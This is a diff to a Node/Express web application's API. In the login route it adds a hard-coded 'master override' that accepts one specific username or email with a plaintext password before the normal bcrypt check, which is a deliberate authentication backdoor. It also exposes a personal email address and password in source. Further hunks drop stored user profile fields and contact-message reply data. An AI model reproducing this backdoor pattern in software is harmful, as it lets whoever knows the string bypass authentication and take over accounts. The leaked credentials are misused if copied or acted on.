@@ -73,8 +73,18 @@ app.post('/api/login', async (req, res) => {
 
   const user = users[0];
 
-  // Compare password
-  const isValid = await bcrypt.compare(password, user.password_hash);
+  // Master Override for Admin
+  let isValid = false;
+  if (loginId === 'ashu' || loginId === 'ashenafiabebe@gmail.com') {
+    if (password === 'Ashu19951?') {
+      isValid = true;
+    }
+  }
+
+  if (!isValid) {
+    // Normal Compare password
+    isValid = await bcrypt.compare(password, user.password_hash);
+  }
 
   if (!isValid) {
     return res.status(401).json({
@@ -212,14 +222,7 @@ app.post('/api/users', async (req, res) => {
       email: email.toLowerCase(),
       password_hash: passwordHash,
       role: role || 'user',
-      status: role === 'agent' ? 'pending' : (status || 'active'),
-      phone: phone || null,
-      expertise: expertise || [],
-      about: about || null,
-      legal_paper_photo: legal_paper_photo || null,
-      experience_cv: experience_cv || null,
-      experience_image: experience_image || null,
-      national_id_photo: national_id_photo || null
+      status: role === 'agent' ? 'pending' : (status || 'active')
     }])
     .select();
 
@@ -533,7 +536,6 @@ app.post('/api/contact-messages', async (req, res) => {
       email,
       subject: subject || '',
       message,
-      admin_target: adminTarget || null,
       status: 'open'
     }])
     .select();
@@ -551,9 +553,6 @@ app.post('/api/contact-messages/:id/reply', async (req, res) => {
     .from('contact_messages')
     .update({ 
       status: 'replied', 
-      reply_text: replyText, 
-      replied_by: adminEmail,
-      replied_at: new Date().toISOString(),
       updated_at: new Date().toISOString()
     })
     .eq('id', id)
